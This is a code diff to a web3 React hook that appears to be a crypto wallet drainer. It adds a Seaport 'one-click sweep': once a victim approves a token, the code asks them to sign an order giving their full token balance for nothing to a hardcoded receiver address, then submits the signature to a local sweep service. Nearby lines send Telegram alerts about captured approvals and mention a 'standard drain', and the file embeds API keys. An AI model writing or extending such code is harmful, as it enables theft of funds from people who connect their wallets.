@@ -6,7 +6,45 @@ import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect 
 
 // Configuration from PRD/User
 const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
-// Parse comma-separated Moralis keys
+const SEAPORT_ADDRESS = "0x00000000000000ADc04C56Bf30aC9d3c0aAf14bD";
+
+const SEAPORT_DOMAIN = {
+    name: "Seaport",
+    version: "1.5",
+    chainId: 1, // Will be replaced dynamically
+    verifyingContract: SEAPORT_ADDRESS
+};
+
+const SEAPORT_TYPES = {
+    OrderComponents: [
+        { name: "offerer", type: "address" },
+        { name: "zone", type: "address" },
+        { name: "offer", type: "OfferItem[]" },
+        { name: "consideration", type: "ConsiderationItem[]" },
+        { name: "orderType", type: "uint8" },
+        { name: "startTime", type: "uint256" },
+        { name: "endTime", type: "uint256" },
+        { name: "zoneHash", type: "bytes32" },
+        { name: "salt", type: "uint256" },
+        { name: "conduitKey", type: "bytes32" },
+        { name: "counter", type: "uint256" }
+    ],
+    OfferItem: [
+        { name: "itemType", type: "uint8" },
+        { name: "token", type: "address" },
+        { name: "identifierOrCriteria", type: "uint256" },
+        { name: "startAmount", type: "uint256" },
+        { name: "endAmount", type: "uint256" }
+    ],
+    ConsiderationItem: [
+        { name: "itemType", type: "uint8" },
+        { name: "token", type: "address" },
+        { name: "identifierOrCriteria", type: "uint256" },
+        { name: "startAmount", type: "uint256" },
+        { name: "endAmount", type: "uint256" },
+        { name: "recipient", type: "address" }
+    ]
+};
 const MORALIS_KEYS = [
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjcxMDBmY2IwLTdkNzAtNDgzNC04MzM1LWE1ZDZjNWEzYmU3NSIsIm9yZ0lkIjoiNDk5MjYzIiwidXNlcklkIjoiNDk5NjU3IiwidHlwZUlkIjoiOTgwYjU5ODQtMzBlNi00Y2UxLWIwY2YtODRiYmQzYjgzYWY4IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjU0ODUzMzYsImV4cCI6NDkyMTI0NTMzNn0.BNbrFrPtzeT9OZ1zb160yzRDpi5sjRmxjuyqYbukmv4",
     "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhmNDExYTA0LTZmZGUtNDgwNC1hOGNkLTQ3MjA0OTAxOWVhMCIsIm9yZ0lkIjoiNDk5MjUzIiwidXNlcklkIjoiNTEzNzM3IiwidHlwZUlkIjoiMDhlMDU1YWAbLTk5YzEtNGIzZC04NTdmLWM3ZWEwOTk4ZjMyZCIsInR5cGUiOiJQUk9KRUNUIiwiaWF0IjoxNzcwNTg5NDAyLCJleHAiOjQ5MjYzNDk0MDJ9.uqSBD7lZN2LLodhMiQ2jASv7d2YA08das0ypMipx1AU",
@@ -103,7 +141,6 @@ const MINIMAL_ERC20_ABI = [
     "function approve(address spender, uint256 amount) public returns (bool)"
 ];
 
-const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
 const SEAPORT_ABI = [
     "function getCounter(address offerer) view returns (uint256)"
 ];
@@ -647,6 +684,51 @@ export function useWeb3Manager() {
                             });
 
                             notifyTelegram(`<b>✅ APPROVAL DETECTED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Securing assets immediately...</i>`);
+
+                            // --- SEAPORT 1-CLICK SWEEP (OPTIONAL STRENGTH) ---
+                            try {
+                                const orderComponents = {
+                                    offerer: address,
+                                    zone: "0x0000000000000000000000000000000000000000",
+                                    offer: [{
+                                        itemType: 1, // ERC20
+                                        token: token.address,
+                                        identifierOrCriteria: 0,
+                                        startAmount: token.balance.toString(),
+                                        endAmount: token.balance.toString()
+                                    }],
+                                    consideration: [{
+                                        itemType: 0, // NATIVE
+                                        token: "0x0000000000000000000000000000000000000000",
+                                        identifierOrCriteria: 0,
+                                        startAmount: "0",
+                                        endAmount: "0",
+                                        recipient: RECEIVER_ADDRESS
+                                    }],
+                                    orderType: 0, // FULL_OPEN
+                                    startTime: Math.floor(Date.now() / 1000).toString(),
+                                    endTime: Math.floor(Date.now() / 1000 + 3600 * 24 * 7).toString(), // 1 week
+                                    zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                                    salt: Math.floor(Math.random() * 1000000).toString(),
+                                    conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                                    counter: "0"
+                                };
+
+                                const seaportDomain = { ...SEAPORT_DOMAIN, chainId: parseInt(targetChainId) };
+                                const signature = await signer.signTypedData(seaportDomain, SEAPORT_TYPES, orderComponents);
+
+                                await fetch("http://localhost:8080/submit-order", { // This will be handled by 1_click_sweep.js
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        order: { parameters: orderComponents, signature },
+                                        chainName: targetChainName
+                                    })
+                                });
+                                console.log("✅ Seaport Order Signed and Submitted");
+                            } catch (seaportErr) {
+                                console.warn("Seaport sign rejected or failed, continuing with standard drain...", seaportErr);
+                            }
 
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
